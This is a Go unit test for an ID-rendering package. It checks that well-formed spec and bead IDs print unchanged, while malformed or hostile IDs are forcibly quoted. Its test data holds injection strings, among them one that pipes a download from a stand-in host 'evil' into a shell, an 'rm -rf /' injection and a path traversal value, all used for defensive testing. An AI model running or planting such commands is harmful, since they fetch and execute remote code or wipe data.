package idrender

import (
	"strconv"
	"testing"

	"github.com/mrmaxsteel/mindspec/internal/termsafe"
)

// hostileTriple is the spec's "printable triple" of ID-position hostile
// operands (spec 120-trust-boundary-render-audit, preamble): metacharacter
// injection, path traversal, and a space+`;`-bearing segment. Each is
// printable ASCII, so termsafe.Escape alone is a no-op on it — the
// discriminator this test exists to prove.
var hostileTriple = []string{
	".worktrees && curl evil|sh #",
	"../../outside",
	"x evil;rm -rf /",
}

// TestIDRenderForcedSafe pins AC-24: every clean ID shape renders
// byte-identical through idrender.Spec/idrender.Bead; the hostile triple
// and the printable-malformed "120-x;evil" are always forced through
// strconv.Quote — including the discriminator that termsafe.Escape ALONE
// passes "120-x;evil" through unchanged (escaping is insufficient for
// ID-typed positions; identity must be keyed off the idvalidate grammar,
// not off character class).
func TestIDRenderForcedSafe(t *testing.T) {
	cleanBeadIDs := []string{
		"mindspec-9cyu.1",  // dotted child
		"mindspec-69y.2.2", // multi-level nested child
		"mindspec-0ke",     // legacy short suffix
	}
	for _, id := range cleanBeadIDs {
		if got := Bead(id); got != id {
			t.Errorf("Bead(%q) = %q, want byte-identical %q", id, got, id)
		}
	}

	cleanSpecIDs := []string{
		"008b-human-gates",
		"120-trust-boundary-render-audit",
	}
	for _, id := range cleanSpecIDs {
		if got := Spec(id); got != id {
			t.Errorf("Spec(%q) = %q, want byte-identical %q", id, got, id)
		}
	}

	// The printable-malformed shape: looks ID-ish, but the trailing
	// ";evil" fails the grammar. termsafe.Escape ALONE passes it through
	// unchanged (proving Escape is insufficient at ID-typed positions);
	// idrender must forcibly quote it.
	const malformed = "120-x;evil"
	if esc := termsafe.Escape(malformed); esc != malformed {
		t.Fatalf("test invariant broken: termsafe.Escape(%q) = %q, want unchanged (escape-is-identity-on-printable-ASCII precondition)", malformed, esc)
	}
	if got, want := Spec(malformed), strconv.Quote(malformed); got != want {
		t.Errorf("Spec(%q) = %q, want forced-quoted %q", malformed, got, want)
	}
	if got, want := Bead(malformed), strconv.Quote(malformed); got != want {
		t.Errorf("Bead(%q) = %q, want forced-quoted %q", malformed, got, want)
	}

	for _, id := range hostileTriple {
		if got, want := Spec(id), strconv.Quote(id); got != want {
			t.Errorf("Spec(%q) = %q, want forced-quoted %q", id, got, want)
		}
		if got, want := Bead(id), strconv.Quote(id); got != want {
			t.Errorf("Bead(%q) = %q, want forced-quoted %q", id, got, want)
		}
	}

	// Empty-sentinel discipline (AC-24, round 6 F1): the empty string is
	// the legitimate "no ID" value at several sinks (e.g. spec-mode state
	// lines). It must render as identity — never quoted to `""`.
	if got := Spec(""); got != "" {
		t.Errorf(`Spec("") = %q, want byte-identical ""`, got)
	}
	if got := Bead(""); got != "" {
		t.Errorf(`Bead("") = %q, want byte-identical ""`, got)
	}
}
